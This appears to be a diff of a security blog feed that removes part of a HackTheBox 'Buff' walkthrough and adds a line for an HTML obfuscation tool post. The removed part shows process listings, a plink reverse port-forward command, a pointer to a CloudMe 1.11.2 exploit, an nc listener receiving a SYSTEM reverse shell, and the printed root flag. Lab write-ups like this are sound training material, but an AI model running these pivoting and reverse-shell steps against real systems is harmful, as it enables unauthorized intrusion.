-<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="o">&gt;</span><span class="n">powershell</span> <span class="n">ps</span>
-<span class="n">powershell</span> <span class="n">ps</span>
-
-<span class="no">Handles</span>  <span class="no">NPM</span><span class="p">(</span><span class="no">K</span><span class="p">)</span>    <span class="no">PM</span><span class="p">(</span><span class="no">K</span><span class="p">)</span>      <span class="no">WS</span><span class="p">(</span><span class="no">K</span><span class="p">)</span>     <span class="no">CPU</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>     <span class="no">Id</span>  <span class="no">SI</span> <span class="no">ProcessName</span>                                                  
-<span class="o">-------</span>  <span class="o">------</span>    <span class="o">-----</span>      <span class="o">-----</span>     <span class="o">------</span>     <span class="o">--</span>  <span class="o">--</span> <span class="o">-----------</span>                                                  
-    <span class="mi">432</span>      <span class="mi">24</span>    <span class="mi">18324</span>       <span class="mi">9180</span>              <span class="mi">6612</span>   <span class="mi">1</span> <span class="no">ApplicationFrameHost</span>                                         
-    <span class="mi">161</span>      <span class="mi">10</span>     <span class="mi">1940</span>       <span class="mi">2176</span>              <span class="mi">7140</span>   <span class="mi">1</span> <span class="n">browser_broker</span>                                               
-    <span class="mi">237</span>      <span class="mi">19</span>    <span class="mi">26404</span>      <span class="mi">29328</span>              <span class="mi">5536</span>   <span class="mi">0</span> <span class="no">CloudMe</span>                                                      
-    <span class="mi">286</span>      <span class="mi">62</span>    <span class="mi">30312</span>        <span class="mi">372</span>              <span class="mi">6088</span>   <span class="mi">0</span> <span class="no">CloudMe</span>                                                      
-    <span class="mi">289</span>      <span class="mi">16</span>     <span class="mi">2896</span>       <span class="mi">2548</span>       <span class="mf">0.17</span>   <span class="mi">1396</span>   <span class="mi">0</span> <span class="no">CloudMe_1112</span>                                                 
-    <span class="mi">269</span>      <span class="mi">16</span>     <span class="mi">2868</span>        <span class="mi">200</span>       <span class="mf">0.98</span>   <span class="mi">8772</span>   <span class="mi">0</span> <span class="no">CloudMe_1112</span>      
-</code></pre></div></div>
-
-<p>This command in PowerShell is used to print what program/process is running. You can see 5536 is the PID of CloudMe software.</p>
-
-<p>This is conformed after finding <code class="language-plaintext highlighter-rouge">cloudme</code> is running in <code class="language-plaintext highlighter-rouge">Downloads</code> folder of <code class="language-plaintext highlighter-rouge">Shaun</code>.</p>
-
-<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">shaun</span><span class="p">\</span><span class="no">Downloads</span><span class="o">&gt;</span><span class="n">dir</span>
-<span class="n">dir</span>
- <span class="no">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="no">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="o">.</span>
- <span class="no">Volume</span> <span class="no">Serial</span> <span class="no">Number</span> <span class="n">is</span> <span class="no">A22D</span><span class="o">-</span><span class="mi">49</span><span class="no">F7</span>
-
- <span class="no">Directory</span> <span class="n">of</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">shaun</span><span class="p">\</span><span class="no">Downloads</span>
-
-<span class="mi">23</span><span class="o">/</span><span class="mo">07</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">07</span><span class="p">:</span><span class="mi">58</span>    <span class="o">&lt;</span><span class="no">DIR</span><span class="o">&gt;</span>          <span class="o">.</span>
-<span class="mi">23</span><span class="o">/</span><span class="mo">07</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">07</span><span class="p">:</span><span class="mi">58</span>    <span class="o">&lt;</span><span class="no">DIR</span><span class="o">&gt;</span>          <span class="o">..</span>
-<span class="mi">23</span><span class="o">/</span><span class="mo">07</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">05</span><span class="p">:</span><span class="mi">35</span>            <span class="mi">61</span><span class="p">,</span><span class="mi">440</span> <span class="n">nc</span><span class="p">.</span><span class="nf">exe</span>
-<span class="mi">23</span><span class="o">/</span><span class="mo">07</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">07</span><span class="p">:</span><span class="mi">56</span>           <span class="mi">675</span><span class="p">,</span><span class="mi">752</span> <span class="n">plink</span><span class="p">.</span><span class="nf">exe</span>
-               <span class="mi">3</span> <span class="no">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>     <span class="mi">18</span><span class="p">,</span><span class="mi">568</span><span class="p">,</span><span class="mo">016</span> <span class="n">bytes</span>
-               <span class="mi">2</span> <span class="no">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>   <span class="mi">9</span><span class="p">,</span><span class="mi">798</span><span class="p">,</span><span class="mi">672</span><span class="p">,</span><span class="mi">384</span> <span class="n">bytes</span> <span class="n">free</span>
-</code></pre></div></div>
-
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-
-<h3 id="so-here-is-the-game-plan">So here is the game plan</h3>
-
-<p><code class="language-plaintext highlighter-rouge">Port forwarding to expose remote port 8888 (accessible only from localhost) to YOURPORT local</code></p>
-
-<h2 id="step-1">Step 1</h2>
-
-<h3 id="enable-sshd-service-on-your-kali-machine">Enable <code class="language-plaintext highlighter-rouge">sshd</code> service on your kali machine:</h3>
-<p><code class="language-plaintext highlighter-rouge">sudo systemctl start ssh.socket</code></p>
-
-<h2 id="step-2">Step 2</h2>
-<h3 id="use-plink-to-portforward-on-your-local-listener">Use <code class="language-plaintext highlighter-rouge">Plink</code> to portforward on your local listener</h3>
-
-<p><code class="language-plaintext highlighter-rouge">plink.exe -v -x -a -T -C -noagent -ssh -pw {Password} -R {Your_Port}:127.0.0.1:8888 user@{IP_address}</code></p>
-
-<p>If every thing works correctly.. You should see this ..</p>
-
-<p><img src="/assets/img/sample/buff/buff6.png" alt="" /></p>
-
-<h2 id="cloudme-1112--cve--administrator">CloudMe 1.11.2 -CVE – Administrator:</h2>
-
-<p><code class="language-plaintext highlighter-rouge">Exploit for CloudMe 1.11.2: https://www.exploit-db.com/exploits/48389</code></p>
-
-<h3 id="the-shellcode-should-be-changed-in-order-to-get-the-reverse-shell">The shellcode should be changed in order to get the <code class="language-plaintext highlighter-rouge">reverse shell</code>.</h3>
-<hr />
-<hr />
-
-<h2 id="note">Note:</h2>
-
-<p><code class="language-plaintext highlighter-rouge"> Use some higher port in order to get the reverse shell perfectly, cause there are so many people bashing the same machine at same time.</code></p>
-
-<hr />
-<h3 id="you-should-see-this-if-the-exploit-runs-correctly">you should see this if the exploit runs correctly.</h3>
-
-<p><img src="/assets/img/sample/buff/buff7.png" alt="" /></p>
-
-<p>Once Every this is set and run properly then you should be good to get the <code class="language-plaintext highlighter-rouge">reverse shell</code> and grab the <code class="language-plaintext highlighter-rouge">Root.txt</code></p>
-
-<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nc</span> <span class="o">-</span><span class="n">lnvp</span> <span class="mi">60000</span>
-<span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">60000</span> <span class="o">...</span>
-<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.51</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="no">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.198</span><span class="p">]</span> <span class="mi">49723</span>
-<span class="no">Microsoft</span> <span class="no">Windows</span> <span class="p">[</span><span class="no">Version</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">17134.1550</span><span class="p">]</span>
-<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2018</span> <span class="no">Microsoft</span> <span class="no">Corporation</span><span class="o">.</span> <span class="no">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>
-
-<span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">system32</span><span class="o">&gt;</span>
-</code></pre></div></div>
-
-<h2 id="getting-roottxt">Getting Root.txt</h2>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span><span class="n">cd</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span>
-<span class="n">cd</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span>
-
-<span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span><span class="o">&gt;</span><span class="nb">type</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>
-<span class="nb">type</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>
-<span class="mf">2e881649240</span><span class="n">e8868c48daee707659212</span>
-
-<span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\
-</code></pre></div></div>
-<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.</p>
-
-<p>My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="hackthebox" /><category term="windows," /><category term="cve," /><category term="portforwarding" /><summary type="html"><![CDATA[Buff is a Hackthebox active machine, so you need the Admin hash to decrypt the walkthrough!]]></summary></entry></feed>
+<p><em>Note: Regular updates and community feedback help improve tool effectiveness and security.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="tools" /><category term="python" /><summary type="html"><![CDATA[Simple Python program to Obfuscate and Dobfuscate HTML files. The program also allows you to obfuscate and Dobfuscate multiple files in one go.]]></summary></entry></feed>
